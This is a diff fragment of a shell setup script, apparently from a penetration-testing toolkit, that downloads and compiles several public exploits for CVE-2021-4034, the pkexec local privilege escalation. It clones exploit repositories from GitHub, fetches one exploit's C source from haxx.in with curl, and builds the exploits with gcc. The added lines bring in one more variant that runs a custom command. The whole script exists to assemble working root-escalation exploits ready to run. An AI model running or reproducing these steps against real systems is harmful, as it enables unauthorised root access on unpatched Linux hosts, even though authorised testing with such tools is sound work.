@@ -25,5 +25,7 @@ mkdir CVE-2021-4034_python && git clone $GITHUB/joeammond/CVE-2021-4034.git CVE-
 mkdir CVE-2021-4034_precompiled && git clone $GITHUB/c3c/CVE-2021-4034.git CVE-2021-4034_precompiled
 mkdir blasty-vs-pkexec2 && cd blasty-vs-pkexec2/ && curl https://haxx.in/files/blasty-vs-pkexec2.c -o blasty-vs-pkexec2.c && \
     gcc -o blasty-vs-pkexec2.so -fPIC -shared blasty-vs-pkexec2.c -Wl,-e,entry
+mkdir CVE-2021-4034_custom_command && git clone https://github.com/zhzyker/CVE-2021-4034.git CVE-2021-4034_custom_command && cd CVE-2021-4034_custom_command && \
+    gcc cve-2021-4034.c -o cve-2021-4034
 cd $WORKDIR
 echo "Done"
